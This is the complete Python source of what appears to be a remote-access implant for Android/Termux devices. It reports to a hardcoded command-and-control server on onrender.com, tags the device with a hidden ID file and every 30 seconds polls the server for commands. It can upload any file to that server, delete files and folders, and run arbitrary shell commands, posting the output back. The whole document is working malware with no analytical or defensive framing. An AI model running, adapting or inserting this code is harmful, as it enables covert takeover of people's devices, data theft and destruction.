import os
import time
import subprocess
import random
import string
import shutil
import requests

SERVER_URL = "https://termux-c2-dktq.onrender.com"
ID_FILE = os.path.expanduser('~/.config/.cache/device_id.txt')

def get_device_info():
    dev_id = "P-err"
    dev_model = "Unknown"
    try:
        if os.path.exists(ID_FILE):
            with open(ID_FILE, 'r') as f:
                dev_id = f.read().strip()
        if not dev_id or dev_id == "P-err":
            and_id = ""
            try:
                and_id = subprocess.check_output(['/system/bin/settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
            except Exception:
                pass
            if not and_id or and_id == 'null' or len(and_id) < 4:
                and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
            dev_id = f"P-{and_id[:4]}"
            with open(ID_FILE, 'w') as f:
                f.write(dev_id)
        model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        if model:
            dev_model = model
    except Exception:
        pass
    return dev_id, dev_model

def post_output(dev_id, text):
    if len(text) > 4000:
        text = text[:4000] + "\n... [TRUNCATED]"
    try:
        requests.post(f"{SERVER_URL}/api/post_output", 
                      json={"device_id": dev_id, "text": text}, timeout=60)
    except Exception:
        pass

def upload_file(dev_id, path):
    try:
        if os.path.getsize(path) == 0:
            return
        filename = os.path.basename(path)
        res = requests.get(f"{SERVER_URL}/api/get_upload_url?device_id={dev_id}&filename={filename}", timeout=60)
        upload_url = res.json().get("url")
        if upload_url:
            with open(path, 'rb') as f:
                requests.put(upload_url, data=f, timeout=120)
            post_output(dev_id, f"OK: Uploaded {filename}")
    except Exception as e:
        post_output(dev_id, f"Upload ERROR: {e}")

def main():
    dev_id, dev_model = get_device_info()
    while True:
        try:
            requests.post(f"{SERVER_URL}/api/heartbeat", 
                          json={"device_id": dev_id, "model": dev_model}, timeout=60)
            
            res = requests.get(f"{SERVER_URL}/api/get_command?device_id={dev_id}", timeout=60)
            cmd = res.json().get("command", "none")
            
            if cmd and cmd != "none":
                cmd_upper = cmd.upper()
                if cmd_upper.startswith("PULL "):
                    path = cmd[5:].strip()
                    if os.path.isfile(path):
                        post_output(dev_id, f"Pulling file: {os.path.basename(path)}")
                        upload_file(dev_id, path)
                    else:
                        post_output(dev_id, f"ERROR: File {path} not found")
                
                elif cmd_upper.startswith("DELETE "):
                    path = cmd[7:].strip()
                    try:
                        if os.path.isdir(path): shutil.rmtree(path)
                        else: os.remove(path)
                        post_output(dev_id, f"OK: deleted {path}")
                    except Exception as e:
                        post_output(dev_id, f"ERROR: {e}")

                elif cmd_upper.startswith("EXEC "):
                    c = cmd[5:].strip()
                    try:
                        proc = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        out, _ = proc.communicate()
                        post_output(dev_id, out.decode() if out else "No output.")
                    except Exception as e:
                        post_output(dev_id, f"ERROR: {e}")
        except Exception:
            pass
        
        time.sleep(30)

if __name__ == '__main__':
    main()
